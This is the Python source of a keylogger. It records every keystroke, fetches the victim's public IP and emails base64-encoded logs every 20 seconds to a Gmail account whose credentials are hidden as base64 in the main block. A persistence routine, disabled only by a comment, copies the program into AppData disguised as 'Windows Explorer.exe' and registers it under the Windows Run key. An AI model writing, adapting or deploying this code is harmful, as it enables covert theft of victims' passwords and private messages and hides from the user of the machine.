#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import shutil
import subprocess
import sys
import os
import base64
import requests

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.email = email
        self.password = password

        try:
            self.ip = requests.get('https://checkip.amazonaws.com').text.strip()
        except Exception as e:
            print("Error getting ip: " + e)
            self.ip = "NONE"

        self.uLeft = "\u2190"
        self.uRight = "\u2192"
        self.uUp = "\u2191"
        self.uDown = "\u2193"
        self.uTab = "\u21c6"
        self.uShift = "\u27f0"
        self.uBackspace = "\u232b"
        self.uDelete = "\u2326"
        self.uEnter = "\u23ce"
        self.uEsc = "\u238b"
        self.uCtrl = "\u2303"
        self.uCapslock = "\u21ea"
        self.uCmd = "\u2318"

        self.log0 = "\n".join([
            "Tab: %s"%self.uTab,
            "Shift: %s"%self.uShift,
            "Backspace: %s"%self.uBackspace,
            "Delete: %s"%self.uDelete,
            "Enter: %s"%self.uEnter,
            "Esc: %s"%self.uEsc,
            "Ctrl: %s"%self.uCtrl,
            "Caps Lock: %s"%self.uCapslock,
            "Command\\cmd: %s"%self.uCmd,
        ])
        self.log = self.log0

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space: current_key = " "

            elif key == key.left: current_key = self.uLeft
            elif key == key.right: current_key = self.uRight
            elif key == key.up: current_key = self.uUp
            elif key == key.down: current_key = self.uDown

            elif key == key.tab: current_key = self.uTab
            elif key == key.shift: current_key = self.uShift
            elif key == key.backspace: current_key = self.uBackspace
            elif key == key.delete: current_key = self.uDelete
            elif key == key.caps_lock: current_key = self.uCapslock 
            elif key == key.enter: current_key = self.uEnter 
            elif key == key.esc: current_key = self.uEsc 
            elif key == key.ctrl: current_key = self.uCtrl 
            elif key == key.cmd: current_key = self.uCmd

            else: current_key = " " + str(key) + " "

        self.log += current_key

    def report(self):
        print(self.log)
        self.send_mail(base64.b64encode(self.log.encode("utf-8")))
        self.log = self.log0

        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, message):
        mail = "Subject: Report from {}\n\n\nLogs:\n\n{}".format(self.ip, message) 
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, mail)
            server.quit()
        except Exception as e:
            print("send_mail E/" + e)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()            

    def windowsPersistance(self):
        fileLocation = os.environ["appdata"] + "\\Windows Explorer.exe"
        if fileLocation and not os.path.exists(fileLocation):
            self.log = "** Keylogger started ** "
            shutil.copyfile(sys.executable, fileLocation)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v winexplorer /t REG_SZ /d "' + fileLocation + '"',shell=True)

if __name__ == "__main__":
    m = base64.b64decode(b'YXRoZXJvczA5OEBnbWFpbC5jb20=')
    p = base64.b64decode(b'YXRoZXJvczEyMw==')
    time_interval = 20

    k = Keylogger(time_interval, m.decode(), p.decode())
    # k.windowsPersistance()
    k.start()
    print(k.log0)